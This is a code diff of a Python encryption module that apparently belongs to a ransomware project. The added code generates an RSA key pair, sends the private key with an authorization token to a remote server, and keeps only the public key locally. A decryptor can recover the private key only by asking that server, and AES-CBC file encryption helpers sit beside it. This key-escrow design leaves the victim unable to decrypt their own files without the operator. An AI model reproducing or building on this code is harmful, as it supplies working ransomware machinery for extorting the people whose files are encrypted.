@@ -4,28 +4,8 @@ from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives.asymmetric import rsa
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-import hashlib, hmac, constants, os
-
-def AESCiphers(key, iv):
-	cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
-	return (cipher.encryptor(), cipher.decryptor())
-
-def RSACiphers(RSA_Folder_Path):
-
-	if constants.RSA_PUBLIC_KEY_FILE not in os.listdir(RSA_Folder_Path) or constants.RSA_PRIVATE_KEY_FILE not in os.listdir(RSA_Folder_Path):
-		genKeyPair(RSA_Folder_Path)
-	
-	with open(os.path.join(RSA_Folder_Path, constants.RSA_PRIVATE_KEY_FILE), 'rb') as key:
-		private_key = serialization.load_pem_private_key(
-			key.read(),
-			password=None,
-			backend=default_backend()
-		)
-		public_key = private_key.public_key()
-
-	return (public_key, private_key)
-
-
+from base64 import b64encode
+import hashlib, hmac, constants, os, sys, requests
 
 def pad(msg):
 
@@ -48,35 +28,72 @@ def unpad(msg):
     data += unpadder.finalize()
     return data
 
-
 def HMAC(data, key):
+    return hmac.new(key, data, hashlib.sha256).hexdigest()
 
-	return hmac.new(key, data, hashlib.sha256).hexdigest()
+def FileEncryptor(key, iv):
+	return Cipher(
+        algorithms.AES(key), 
+        modes.CBC(iv), 
+        backend=default_backend()).encryptor()
 
+def FileDecryptor(key, iv):
+    return Cipher(
+        algorithms.AES(key), 
+        modes.CBC(iv), 
+        backend=default_backend()).decryptor()
 
-def genKeyPair(RSA_Folder_Path):
+def RSAEncryptor():
+    return GenKeyPair()
+    
+def RSADecryptor():
+    pub_key_file = open(constants.RSA_PUBLIC_KEY_FILE, 'rb')
+    publicKey = pub_key_file.read()
+    pub_key_file.close()
+    privateKey = GetRequest(constants.URL + '/retrieve/', publicKey)
+    if 'exist' in str(privateKey).lower():
+        sys.exit(1)
+    return serialization.load_pem_private_key(
+        privateKey,
+        password=None,
+        backend=default_backend())
 
-	private_key = rsa.generate_private_key(
-		public_exponent = constants.EXPONENT, 
-		key_size = constants.RSA_LENGTH_OF_KEY, 
-		backend = default_backend()
-	)
+def GenKeyPair():
+    private_key = rsa.generate_private_key(
+        public_exponent = constants.EXPONENT,
+        key_size = constants.RSA_LENGTH_OF_KEY,
+        backend = default_backend()
+    )
+    private_key_raw = private_key.private_bytes(
+        encoding = serialization.Encoding.PEM,
+        format = serialization.PrivateFormat.TraditionalOpenSSL,
+        encryption_algorithm = serialization.NoEncryption()
+    )
 
-	private_key_raw = private_key.private_bytes(
-		encoding = serialization.Encoding.PEM, 
-		format = serialization.PrivateFormat.TraditionalOpenSSL,
-		encryption_algorithm = serialization.NoEncryption()
-	)
+    public_key = private_key.public_key()
 
-	with open(os.path.join(constants.RSA_FOLDER_PATH, constants.RSA_PRIVATE_KEY_FILE), 'wb') as key:
-		key.write(private_key_raw)
+    public_key_raw = public_key.public_bytes(
+        encoding = serialization.Encoding.PEM,
+        format = serialization.PublicFormat.SubjectPublicKeyInfo
+    )
 
-	public_key = private_key.public_key()
+    PostRequest(constants.URL + '/post/', public_key_raw, private_key_raw)
 
-	public_key_raw = public_key.public_bytes(
-		encoding = serialization.Encoding.PEM,
-		format = serialization.PublicFormat.SubjectPublicKeyInfo
-	)
+    with open(constants.RSA_PUBLIC_KEY_FILE, 'wb') as pub:
+        pub.write(public_key_raw)
 
-	with open(os.path.join(constants.RSA_FOLDER_PATH, constants.RSA_PUBLIC_KEY_FILE), 'wb') as key:
-		key.write(public_key_raw)
+    return public_key
+
+def PostRequest(request, publicKey, privateKey):
+    body = {
+        'publicKey' : publicKey,
+        'privateKey' : privateKey
+    }
+    header = {"Authorization" : constants.TOKEN}
+    return requests.post(request, body, headers=header)
+
+def GetRequest(request, publicKey):
+    header = {"Authorization" : constants.TOKEN}
+    body = {'publicKey' : publicKey}
+    content = requests.post(request, body, headers=header).content
+    return content
